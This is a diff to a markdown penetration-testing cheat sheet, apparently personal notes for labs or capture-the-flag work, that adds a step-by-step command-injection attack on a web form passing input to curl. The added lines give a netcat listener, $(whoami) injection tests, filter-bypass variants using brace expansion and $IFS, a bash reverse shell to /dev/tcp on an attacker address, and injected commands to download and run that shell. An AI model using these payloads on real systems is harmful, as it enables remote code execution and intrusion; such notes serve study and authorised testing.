@@ -62,7 +62,7 @@ Attempt to Bold Text
 ```form
 <b>TITLE/USERNAME</b>
 ```
-### Check Connection
+### Check if there is a User-Agent 
 Set up Listener on Attacking Machine
 ```bash
 sudo nc -lvnp 80
@@ -72,6 +72,69 @@ In Post
 http://<ATTACKING_IP>/
 ```
 Take note User-Agent (ex. Curl)
+#### Curl
+Ex. Request:
+```bash
+os.popen(curl $Content)
+```
+1. Check if you can download a file
+
+(On Attacking Machine)
+  ```bash
+  echo "Test" > test
+  ```
+(Website: Post)
+  ```form
+  http://<ATTACKING_IP>/test -o /var/www/html/test
+  ```
+(Website)
+Go to http://IP/test to see if the test file is there
+
+2. Check if you can execute code
+
+Proof of Concept:
+  ```form
+  http://<ATTACKING_IP>/$(whoami)
+  ```
+Burp Suite Repeater (Capture Request)
+
+  Test
+  ```form
+  http://<ATTACKING_IP>/$(echo test)
+  ```
+
+  URL Encoding
+  ```form
+  http://<ATTACKING_IP>/$(echo+test)
+  ```
+
+  Bracket Expansion
+  ```form
+  http://<ATTACKING_IP>/$({echo,test})
+  ```
+
+  IFS Variable
+  ```form
+  http://<ATTACKING_IP>/$(echo$IFS'test')
+  ```
+
+3. Execute a Reverse shell
+Reverse Shell
+```File
+bash -c 'bash -i &> /dev/tcp/<ATTACKING_IP>/<PORT> 0>&1'
+```
+Start Web Server 
+```bash
+sudo python3 -m http.server 80
+```
+Download Reverse Shell
+```form
+http://<ATTACKING_IP>/$(curl$IFS' -o'$IFS'/var/www/html/test'$IFS'http://ATTACKING_IP>/test')
+```
+Execute Reverse Shell
+```form
+http://<ATTACKING_IP>/$(bash$IFS'/var/www/html/test')
+```
 ## Searchsploit
 Search for CMS exploits with similar version numbers 
 > [!NOTE]
